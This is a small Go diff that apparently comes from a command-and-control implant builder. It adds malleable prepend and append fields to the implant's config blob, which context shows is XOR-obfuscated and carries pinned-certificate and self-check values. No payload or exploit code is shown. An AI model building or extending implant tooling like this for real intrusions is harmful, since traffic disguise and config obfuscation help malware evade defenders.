@@ -50,6 +50,8 @@ type agentConfigJSON struct {
 	SSHHostKey       string `json:"ssh_host_key"`
 	PinnedCertSHA256 string `json:"pinned_cert"`
 	SelfCheckSHA256  string `json:"self_check"`
+	MalleablePrepend string `json:"malleable_prepend"`
+	MalleableAppend  string `json:"malleable_append"`
 }
 
 // obfuscateBlob XOR-obfuscates the config blob with a fresh random key so the
@@ -138,6 +140,8 @@ func buildConfigBlob(cfg ImplantConfig, profile MalleableProfile) string {
 		SSHHostKey:       cfg.SSHHostKey,
 		PinnedCertSHA256: cfg.PinnedCertSHA256,
 		SelfCheckSHA256:  cfg.SelfCheckSHA256,
+		MalleablePrepend: cfg.MalleablePrepend,
+		MalleableAppend:  cfg.MalleableAppend,
 	}
 	raw, err := json.Marshal(bc)
 	if err != nil {
